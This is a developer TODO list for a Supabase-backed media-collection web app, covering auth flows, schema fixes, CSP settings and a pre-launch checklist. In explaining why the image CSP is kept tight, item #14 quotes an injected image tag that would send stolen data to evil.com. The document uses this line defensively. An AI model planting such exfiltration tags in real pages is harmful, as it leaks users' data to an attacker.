# TODO

Short list of concrete next actions, prioritized. Cross items off as you finish them. For the full long-term backlog see [ideas.md](./ideas.md).

---

## 🔴 Top priority — do these next

### 1. ~~Verify schema applied in Supabase~~ ✅ Done 2026-05-14
Tables, policies, and `handle_new_user` trigger all confirmed in the Supabase dashboard.

### 2. ~~End-to-end smoke test~~ ✅ Done 2026-05-14
Sign-up + sign-in + adding items + persistence across sign-out all verified. Email confirmation disabled in Supabase to skip the localhost redirect issue. RLS bonus check (second user can't see first user's items) still untested — flag for any future session if you want to be paranoid.

### 3. ~~`npm audit fix`~~ ✅ Done 2026-05-14
Cleared all 4 vulnerabilities (postcss XSS, ws memory disclosure, 5 vite dev-server CVEs). Required a minor-version bump of vite from 6.3.5 → 6.4.2. Build verified clean afterward. `npm audit` now reports 0 vulnerabilities.

---

## 🟡 Worth a look soon

### A. Refresh shouldn't flash through landing → sign-in → target
When a signed-in user hits browser refresh, the app momentarily renders the landing page, then the sign-in page, then the page they were actually on. Should go straight from refresh → restored page (probably show a neutral loading state while `supabase.auth.getSession()` resolves, instead of defaulting to "logged-out landing" first). Likely fix is in `App.tsx` / `useAuth` initial-render branch — gate the landing/sign-in fallback on `auth.isReady` so unauthenticated UI only renders after we've confirmed there's no session.

### F. ~~Default new-item status to the user's current view~~ ✅ Done 2026-05-22
`defaultStatusForActiveSection()` in `ItemFormDialog` preselects status
(Watched / Want to See) from the active sub-section; custom-section
checkbox preselect was already wired. Dialog description now reads
"Adding to: <Category> › <Section>" so the user can see and override
the preselect intentionally. Verification checklist in
[testing.md](./testing.md#-add-item--auto-default-to-active-view-todo-f).

### G. Choose sub-category when accepting a recommendation
Today `useRecommendations.accept` materialises the snapshot into the
recipient's collection with hardcoded `status: "want-to-see"` and no
sub-section assignment. The recipient should be able to pick which
sub-section it lands in (e.g. add to a custom "Date night" section, or
mark it Watched immediately if they've already seen it).
- In `RecommendationsTab`, replace the inline ✓ Accept button with an
  "Add to my collection" flow that opens a small picker (status radio
  + optional sub-section dropdown from the recipient's `customSections`).
- Pass `customSections` + `addItem` from App.tsx into the
  RecommendationsTab (currently only `recommendations` is passed) so
  the picker has its options.
- Default the picker to "Want to See" + no sub-section, so the
  one-click "just add it" case stays fast — the user only has to
  expand if they want to customise.

### E. Upload / change user profile picture
Right now the sidebar + ProfileDialog avatars both render the generic
User icon on the accent-color gradient — there's no way for a user to
upload their own. Build out:
- A file input in ProfileDialog (Settings → Profile section) that lets
  the user pick a local image (PNG / JPG, ≤ ~2 MB; show inline error
  for oversized or wrong-type files).
- Upload to a new Supabase Storage bucket (e.g. `avatars/`) using
  `supabase.storage.from('avatars').upload(...)` keyed by user id.
  Public-read RLS or signed URL — whichever fits.
- Persist the resulting public URL onto `profiles.profile_image` (column
  already in the User type as `profileImage`; add it to the schema if
  not already present).
- Render `AvatarImage` from that URL in BOTH the sidebar avatar button
  and the ProfileDialog `<Avatar>` — fall back to the current User-icon
  +accent-gradient when no image is set.
- "Remove photo" button to revert to the default.
- Image-source guardrails: extend `index.html` CSP `img-src` to include
  the Supabase storage hostname (`*.supabase.co`).
- Demo users: keep this disabled / use a fixed mock image, per the
  isolate-demo rule.

### D. Wire up the Tailwind v4 Vite plugin (re-enable JIT)
The current `src/styles/index.css` is the entire prebuilt Tailwind v4
output — there's no `@tailwindcss/vite` plugin in `vite.config.ts`, no
`tailwind.config.*`, and no `@import "tailwindcss"` directive. Writing
a new utility class in JSX (e.g. `text-white!`, `text-white/50`,
`placeholder:text-white/50`) doesn't generate any CSS, so anything
that isn't already in the prebuilt sheet has to be backed by a custom
rule in index.css (see `.friend-tab-trigger`, `.friend-input`). To fix:
- `npm i -D @tailwindcss/vite tailwindcss`
- Add `@import "tailwindcss";` at the top of `src/styles/index.css`
  (replacing the long prebuilt block) and wire the plugin in
  `vite.config.ts`.
- Verify dark mode still works (the project uses `.dark` class — keep
  the existing `:root` / `.dark` token blocks).
- After upgrading, the `.friend-tab-trigger` and `.friend-input` custom
  rules become collapsible into normal Tailwind utilities with `!`
  modifiers. Optional cleanup.
- Risk: any custom CSS layered on top of the prebuilt sheet needs
  re-checking. Do this in its own session and smoke-test every dialog.

### C. Hover-over highlight pass for bars & links
Polish pass on every clickable surface in the navigation / dialogs.
Today most of them have either no hover state or just a faint
`hover:brightness-125`. Audit: sidebar categories, sub-section items,
custom-tab rows, gear-dropdown items, FriendsDialog tabs + rows, dialog
buttons. Decide on a single hover language (e.g. subtle white-overlay
+ accent-coloured left border) and apply it consistently. Centralise
the hover className in one shared constants file so every component
picks up future tweaks automatically.

### B. Clean up orphan profile rows + prevent future leftovers
Right now when an `auth.users` row is deleted, the matching `public.profiles` row can stay behind (no `on delete cascade` from profiles.id → auth.users.id). That means a re-signed-up "test" user can collide with an old "test" profile, and username searches can return ghosts. To fix:
- Add `on delete cascade` to the `profiles_id_fkey` (drop + recreate the FK).
- One-time cleanup: `delete from public.profiles where id not in (select id from auth.users);`
- Verify the same cascade exists on `collection_items.user_id`, `custom_tabs.user_id`, `custom_sections.user_id`, `preferences.user_id`, `friendships.requester_id` / `addressee_id` (the friendships table already has it — confirm the rest).

### 3. ~~Check FormatGuideDialog's Pro Tip box in light mode~~ ✅ Done 2026-05-14
Visually verified — `bg-accent` reads as distinct from the surrounding dialog in light mode.

### 4. Decide on dark-mode polish (or skip)
Two items in [ideas.md](./ideas.md) under "Architecture":
- Wrapping content sections in `<Card>` for proper theming
- Full theme-token sweep across MainContent/ListView/etc.

Both are bigger UI changes. Only worth doing if you want dark mode to be a flagship visual feature. Otherwise the current state (dark sidebar + dark page bg in both modes) is fine.

---

## 🟢 Nice to have (no rush)

### 5. ~~In-app change password~~ ✅ Done 2026-05-14
Password section in Settings → Account: new-password + confirm-password fields with a Save button. Save enables only when the new password is ≥ 6 chars AND matches the confirm input. Mismatch / too-short surface as inline errors before hitting Supabase. Section hidden for demo users (no Supabase Auth row to update). Hooks into the existing `auth.handleChangePassword` that was added during #10.

### 6. ~~Dice picker — random suggestion from a category~~ ✅ Done 2026-05-14
Implemented as planned, isolated under `src/picker/` (matches `src/demo/`, `src/tmdb/`, `src/auth/`). Dice icon button sits next to the "+ Add" button on desktop; clicking pops a modal with a random item, re-roll button excludes the just-shown one so it actually changes. Empty pool disables the icon entirely; single-item pool disables re-roll. Picks from whatever the user is currently viewing (`itemsInActiveSection`) — so they can scope by navigating to Want to See / Watched / All before rolling. Mobile addition is a follow-up.

### 7. Mobile view completion
Earlier commit said "working on mobile view" — components exist in `src/components/mobile/` but weren't finished. Tackle when you have mobile users or before publishing.

### 6. ~~Toast/banner on Supabase failures~~ ✅ Done 2026-05-14
`usePreferences.ts` upsert + load and `useAuth.ts` profile load now toast on real failures instead of silently `console.error`-ing. PGRST116 (no rows) is still treated as expected (new users with no preferences row, or sign-up trigger hasn't fired yet) and falls through to defaults silently.

### 7. Add tests for `utils/csv.ts`
The CSV utility is a perfect first test target — pure functions, clear inputs/outputs. Whenever you regress a CSV import this is the obvious thing to set up.

### 8. ~~Account settings: change display name~~ ✅ Done 2026-05-14
"Display name" field in Settings → Account. Save button enables when dirty, calls `auth.handleUpdateProfile({ name })`, toast on success/failure. Demo updates in-memory (mockUsers), Supabase users hit `profiles.name`.

### 9. ~~Account settings: change email~~ ✅ Done 2026-05-14
"Email" section in Settings → Account shows the current email and a "Change email" input + Save button. Calls `supabase.auth.updateUser({ email })`, which sends a confirmation link to the new address — the change only takes effect after the user clicks it. Section is hidden entirely for username-only accounts (their `currentUser.email` is empty after `loadProfile` strips out synthetic addresses). Client-side validation rejects malformed emails and any attempt to switch to a `*@no-email.mycollection.local` synthetic address.

### 10. ~~Account settings: reset password~~ ✅ Done 2026-05-14
"Forgot password?" link on the Sign In page → user enters their email → `supabase.auth.resetPasswordForEmail()` sends a reset link to that address. Clicking the link fires Supabase's `PASSWORD_RECOVERY` event, which `useAuth` listens for and flips a `showPasswordResetPage` flag. App.tsx mounts the new `ResetPasswordPage` on top of everything else until the user enters a new password (`updateUser({ password })`).

Username-only accounts are explicitly blocked at the reset request — toast says "no email to send a reset link to."

Not yet built: in-app "change password" for logged-in users (no email roundtrip). Different flow; defer.

### 11. Pre-launch Supabase settings audit (do this before going live)
Walk through Supabase dashboard → **Authentication** and confirm each setting matches the intended production behavior. Today most of these are at default or set for dev convenience.

- **Sign In / Providers → Email → Confirm email** — currently **OFF** (we turned it off during smoke testing because localhost redirects don't work on phones). For production, turn **ON** so users can't sign up with fake email addresses.
- **Sign In / Providers → Email → Secure email change** — default **ON**. Verify it's still on. Sends confirmation to BOTH old and new address when changing email (anti-takeover).
- **URL Configuration → Site URL** — currently `localhost:5173`. Set to the deployed Vercel URL before launch. This is what confirmation/password-reset links redirect to.
- **URL Configuration → Redirect URLs** — whitelist any allowed redirect destinations (Vercel preview deployments, custom domains, etc.).
- **Rate Limits** — default per-IP limits. Increase if you expect more traffic; tighten if you want to be more conservative against signup spam.
- **Email Templates** — customize the templated emails (signup confirmation, email change, password reset) to match your branding. Currently using Supabase's plain defaults.
- **SMTP Settings** — currently using Supabase's built-in SMTP (≈30 emails/hour rate limit). For real volume, plug in SendGrid / Postmark / Resend.
- **Allow new users to sign up** — verify it's ON (it is by default; would only turn off if you wanted to lock signups).
- **Database → Tables → Policies** — re-verify the RLS policies one more time before launch.

### 12. Test the forgot-password / reset-password flow end-to-end
The reset flow is implemented but untested. To verify (recommend from the same machine running `npm run dev` since the reset link redirects to localhost):
- Sign out → "Forgot password?" → enter your account email → "Send reset link"
- Check inbox → click the link → confirm the ResetPasswordPage appears
- Enter a new password (twice) → confirm you stay signed in with the new password
- Sign out, sign back in with the new password → should work
- (Negative case) On the Sign In page, click "Forgot password?" → enter a username (no @) → should toast "Password reset is not available" without sending anything

### 13. Pre-deploy readiness checklist (do before going live on Vercel)
Bundle of things to confirm before flipping the switch:
- [Vercel] project connected to the repo; `main` branch deploys to production
- [Vercel] env vars set: `VITE_SUPABASE_URL`, `VITE_SUPABASE_ANON_KEY` (and `VITE_TMDB_TOKEN` if using TMDB search)
- [Supabase] complete the audit in **#11** (Confirm email ON, Site URL = production URL, etc.)
- [Supabase] add the production Vercel URL to **URL Configuration → Redirect URLs**
- [App] `index.html` CSP `connect-src` already covers `*.supabase.co`; no change needed unless using a custom Supabase domain
- [App] `index.html` CSP `img-src` — confirm all expected poster sources are whitelisted (see #14)
- Smoke-test the full flow on the deployed URL from a phone / second device (not just localhost):
  - Sign up with email → confirm via email link → land back in the app
  - Add an item → verify it persists
  - Change email → confirm via email link
  - Forgot password → reset via email link
- Database backup strategy: enable Supabase **Database → Backups** (paid tier) OR document a manual `pg_dump` schedule
- Confirm `npm audit` is still clean before the build

### 14. Expand the CSP `img-src` whitelist when adding new poster sources
`index.html` line 7 currently allows poster images from `'self'`, `https://image.tmdb.org`, and inline `data:` URIs only. This is intentionally tight to prevent data exfiltration via injected `<img src="https://evil.com/log?stolen=...">`. When you let users add posters from other hosts (IMDB, personal photo URLs, etc.), add those hosts to `img-src`. Any image not on the whitelist will silently fail to load.

---

## 🌱 New feature ideas (longer-term)

Detailed write-ups for all three are in [ideas.md](./ideas.md) under "Features":

- **Username-only signup** (no email required) — synthetic-email auth pattern. Schema sketch + recovery-code tradeoffs already documented. Mid-effort (a few hours), single-session feasible.
- **Friend system (view-only list sharing)** — friend requests, view friends' lists read-only. Multi-day feature.
- **Shared / collaborative lists** — multiple users editing the same list together. Depends on the friend system being built first. Multi-day feature.

All three require Supabase schema additions. Don't start without a clear plan — open ideas.md before kicking off.

---

_Last touched: 2026-05-14 (post smoke-test)_
